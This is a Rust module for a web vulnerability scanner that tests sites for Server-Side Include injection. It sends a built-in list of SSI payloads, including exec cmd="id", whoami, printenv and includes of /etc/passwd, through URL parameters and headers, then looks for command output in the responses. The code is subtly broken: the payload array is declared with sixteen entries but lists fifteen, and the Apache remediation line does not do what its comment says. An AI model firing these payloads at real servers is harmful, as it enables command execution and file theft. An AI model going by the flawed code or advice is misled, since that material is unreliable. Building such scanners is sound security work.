//! Server-Side Include (SSI) Injection Detection Module
//!
//! Detects SSI injection via executable directives in headers and user inputs.
//! Implements bounded payload testing with strict memory constraints.

use async_trait::async_trait;
use std::sync::Arc;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, CheckCategory,
    Severity, ResourceBudget, ModuleError,
};
use crate::findings::finding::{Finding, Evidence, EvidenceType, EvidenceLocation, RemediationHint, EffortLevel};
use crate::http::client::HttpClient;
use crate::learning::cache::LearningCache;

/// Maximum SSI payloads (bounded)
const MAX_SSI_PAYLOADS: usize = 16;

/// SSI directive payloads
#[derive(Debug, Clone)]
struct SsiPayloadSet {
    payloads: [(&'static str, &'static str); MAX_SSI_PAYLOADS],
    count: usize,
}

impl SsiPayloadSet {
    fn new() -> Self {
        Self {
            payloads: [
                // Basic SSI commands
                ("<!--#exec cmd=\"id\" -->", "Command execution"),
                ("<!--#exec cmd=\"whoami\" -->", "User enumeration"),
                ("<!--#exec cmd=\"pwd\" -->", "Path disclosure"),
                ("<!--#include file=\"/etc/passwd\" -->", "File inclusion"),
                ("<!--#include virtual=\"/etc/passwd\" -->", "Virtual inclusion"),
                ("<!--#echo var=\"DOCUMENT_ROOT\" -->", "Variable echo"),
                ("<!--#echo var=\"HTTP_USER_AGENT\" -->", "Header echo"),
                ("<!--#printenv -->", "Environment dump"),
                ("<!--#config errmsg=\"visible\" -->", "Config manipulation"),
                ("<!--#fsize file=\"/etc/passwd\" -->", "File size"),
                ("<!--#flastmod file=\"/etc/passwd\" -->", "File modification"),
                // Encoded variants
                ("<!--&#35;exec cmd=\"id\" -->", "HTML encoded"),
                ("<!--%23exec cmd=\"id\" -->", "URL encoded"),
                // Case variations
                ("<!--#EXEC CMD=\"id\" -->", "Uppercase"),
                ("<!--#ExEc CmD=\"id\" -->", "Mixed case"),
            ],
            count: MAX_SSI_PAYLOADS,
        }
    }

    fn iter(&self) -> impl Iterator<Item = &(&'static str, &'static str)> {
        self.payloads[..self.count].iter()
    }
}

/// SSI injection detector
pub struct SsiInjectionDetector {
    metadata: CheckMetadata,
    payload_set: SsiPayloadSet,
}

impl SsiInjectionDetector {
    pub fn new() -> Self {
        let metadata = CheckMetadata::new(
            "eval/ssi_injection",
            "Server-Side Include Injection Detection",
            "Detects SSI injection via executable directives in headers and user inputs",
            Severity::High,
            CheckCategory::RemoteCodeExecution,
        )
        .with_god_mode(true)
        .with_tags(vec!["ssi", "injection", "rce", "file-inclusion"])
        .with_references(vec![
            "https://owasp.org/www-community/attacks/Server_Side_Includes_(SSI)_Injection",
            "https://cwe.mitre.org/data/definitions/97.html",
        ])
        .with_budget(ResourceBudget {
            max_cpu_ms: 1000,
            max_memory_bytes: 2 * 1024 * 1024,
            max_requests: 50,
            max_duration_ms: 5000,
            max_payload_size: 1024,
        });

        Self {
            metadata,
            payload_set: SsiPayloadSet::new(),
        }
    }

    /// Test SSI payload in URL parameter
    async fn test_url_param(
        &self,
        client: &HttpClient,
        url: &str,
        param: &str,
        payload: &str,
    ) -> Result<Option<&'static str>, ModuleError> {
        let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
        
        let response = client.get(&test_url).await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body = response.text().await.unwrap_or_default();
        self.analyze_response(&body, payload)
    }

    /// Test SSI payload in header
    async fn test_header(
        &self,
        client: &HttpClient,
        url: &str,
        header: &str,
        payload: &str,
    ) -> Result<Option<&'static str>, ModuleError> {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::HeaderName::from_bytes(header.as_bytes()).unwrap(),
            reqwest::header::HeaderValue::from_str(payload).unwrap(),
        );

        let response = client.get_with_headers(url, headers).await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body = response.text().await.unwrap_or_default();
        self.analyze_response(&body, payload)
    }

    /// Analyze response for SSI execution evidence
    fn analyze_response(&self, body: &str, payload: &str) -> Option<&'static str> {
        // Check if SSI directive was executed (not reflected)
        if !body.contains(payload) {
            // Look for command output patterns
            let indicators = [
                "uid=",
                "gid=",
                "root:",
                "/bin/",
                "/usr/",
                "Apache/",
                "SERVER_NAME",
                "DOCUMENT_ROOT",
            ];

            for indicator in &indicators {
                if body.contains(indicator) {
                    return Some("SSI directive executed - command output detected");
                }
            }

            // Check for error messages revealing SSI processing
            let body_lower = body.to_lowercase();
            if body_lower.contains("syntax error") || 
               body_lower.contains("unable to include") ||
               body_lower.contains("exec failed") {
                return Some("SSI processing error reveals vulnerability");
            }
        }

        None
    }

    /// Build evidence for SSI finding
    fn build_evidence(&self, url: &str, payload: &str, result: &str) -> Vec<Evidence> {
        vec![
            Evidence {
                evidence_type: EvidenceType::HttpRequestResponse {
                    request: format!("GET {} HTTP/1.1\n\n{}", url, payload),
                    response: format!("Result: {}", result),
                },
                data: result.to_string(),
                location: EvidenceLocation {
                    path: url.to_string(),
                    line: None,
                    parameter: Some("input".to_string()),
                    header: None,
                },
                confidence: 80,
            },
        ]
    }

    /// Generate remediation hint
    fn remediation(&self) -> RemediationHint {
        RemediationHint {
            summary: "Disable SSI processing or sanitize user input".to_string(),
            steps: vec![
                "Disable SSI processing in web server configuration".to_string(),
                "Remove exec capability from SSI directives".to_string(),
                "Sanitize and validate all user input".to_string(),
                "Use allowlists for permitted characters".to_string(),
                "Run web server with minimal privileges".to_string(),
                "Implement proper file permissions".to_string(),
            ],
            code_example: Some(r#"// Apache .htaccess - Disable SSI
Options -Includes
# Or disable exec specifically
Options -IncludesNOEXEC

// Nginx - SSI is disabled by default
# Ensure ssi is off
ssi off;"#.to_string()),
            references: vec![
                "https://httpd.apache.org/docs/current/mod/mod_include.html".to_string(),
                "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html".to_string(),
            ],
            estimated_effort: EffortLevel::Low,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for SsiInjectionDetector {
    async fn init(&mut self) -> Result<(), ModuleError> {
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        &self.metadata
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata.requires_god_mode && !ctx.god_mode {
            return false;
        }
        true
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let client = HttpClient::new();
        let mut findings = Vec::new();
        let mut executed = false;

        let base_url = ctx.target_url.trim_end_matches('/');

        // Common endpoints that might process SSI
        let test_endpoints = [
            "/search",
            "/page",
            "/view",
            "/include",
            "/template",
            "/cgi-bin/test.cgi",
            "/.shtml",
        ];

        let test_params = ["file", "page", "template", "include", "path"];
        let test_headers = ["User-Agent", "Referer", "X-Custom-Header"];

        for endpoint in test_endpoints.iter() {
            let url = format!("{}{}", base_url, endpoint);

            // Test URL parameters
            for param in test_params.iter() {
                for (payload, description) in self.payload_set.iter() {
                    if let Ok(Some(result)) = self.test_url_param(&client, &url, param, payload).await {
                        executed = true;

                        let mut finding = Finding::new(
                            self.metadata.id.as_str(),
                            Severity::High,
                            "Server-Side Include Injection",
                            format!("SSI injection detected at {} via parameter '{}': {}", url, param, description),
                            &url,
                        )
                        .with_payload(payload.to_string())
                        .with_confidence(80)
                        .with_agent_id(ctx.agent_id)
                        .with_tags(vec!["ssi", "injection", "rce"]);

                        let evidence = self.build_evidence(&url, payload, result);
                        for ev in evidence {
                            finding = finding.with_evidence(ev);
                        }

                        finding = finding.with_remediation(self.remediation());
                        findings.push(finding);
                        break;
                    }
                }
            }

            // Test headers
            for header in test_headers.iter() {
                for (payload, description) in self.payload_set.iter() {
                    if let Ok(Some(result)) = self.test_header(&client, &url, header, payload).await {
                        executed = true;

                        let mut finding = Finding::new(
                            self.metadata.id.as_str(),
                            Severity::High,
                            "Server-Side Include Injection (Header-Based)",
                            format!("SSI injection detected at {} via header '{}': {}", url, header, description),
                            &url,
                        )
                        .with_payload(payload.to_string())
                        .with_confidence(75)
                        .with_agent_id(ctx.agent_id)
                        .with_tags(vec!["ssi", "header-injection"]);

                        finding = finding.with_remediation(self.remediation());
                        findings.push(finding);
                        break;
                    }
                }
            }
        }

        // Cache findings for learning engine
        if !findings.is_empty() {
            if let Ok(cache) = LearningCache::global().await {
                cache.cache_bypass_header(ctx.target_url.clone(), "ssi_injection".to_string()).await;
            }
        }

        Ok(CheckResult {
            findings,
            executed,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssi_payload_bounds() {
        let set = SsiPayloadSet::new();
        assert_eq!(set.count, MAX_SSI_PAYLOADS);
    }

    #[test]
    fn test_bounded_storage() {
        let set = SsiPayloadSet::new();
        assert!(std::mem::size_of::<SsiPayloadSet>() <= 2048);
    }
}
